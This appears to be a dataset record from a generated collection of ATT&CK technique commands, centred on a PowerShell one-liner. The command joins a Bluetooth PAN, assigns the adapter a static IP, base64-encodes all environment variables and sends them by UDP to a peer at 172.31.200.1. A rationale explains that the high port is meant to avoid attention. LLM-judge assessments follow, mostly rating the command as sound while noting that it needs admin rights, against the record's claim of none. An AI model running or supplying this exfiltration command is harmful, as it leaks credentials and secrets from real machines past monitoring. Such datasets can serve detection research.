command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 172.31.200.2 255.255.255.252 | Out-Null; $msg=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env: | Out-String))); $u=New-Object Net.Sockets.UdpClient; $u.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.31.200.2'),0)); $dat=[Text.Encoding]::UTF8.GetBytes($msg); $u.Send($dat,$dat.Length,'172.31.200.1',53209) | Out-Null; $u.Close()
explanation: Sends base64-encoded environment data via UDP over a Bluetooth-only subnet, ensuring all traffic uses the alternate Bluetooth medium (T1011).
rationale_steps: Connect to Bluetooth NAP to establish the alternate network medium.
Set a restricted IP on the Bluetooth adapter via netsh.
Bind UDP socket to the Bluetooth IP to force medium use.
Transmit to a high, uncommon UDP port to minimize attention.

llm_judgments.syntactic_justification: PowerShell command is well-formed with balanced quotes/parentheses, proper separators, and valid constructs throughout.
llm_judgments.semantic_justification: It conceptually exfiltrates data over a Bluetooth PAN by binding UDP to a Bluetooth-assigned IP, but it likely fails without admin rights for netsh, omits the gateway/none parameter, and relies on BluetoothCL.exe supporting a NAP connect operation.

llm_judgments.syntactic_justification: The PowerShell command is well-formed with balanced parentheses, proper semicolon separators, valid .NET method calls, correct string interpolation, and no syntax errors.
llm_judgments.semantic_justification: The command correctly implements T1011 by connecting via Bluetooth PAN, assigning a static IP to the Bluetooth network adapter, encoding environment variables in base64, and exfiltrating via UDP over the Bluetooth subnet, though BluetoothCL.exe is a third-party tool that may not reliably establish a NAP connection this way, and the privilege claim of 'None' is unrealistic since configuring network interfaces and connecting Bluetooth devices typically requires elevated privileges.

llm_judgments.syntactic_justification: The command utilizes correct PowerShell syntax, properly handles object properties, and correctly uses semicolons as statement separators.
llm_judgments.semantic_justification: The logic effectively implements exfiltration over Bluetooth (T1011), though the command incorrectly specifies "None" for privileges despite using netsh, which requires administrative rights.
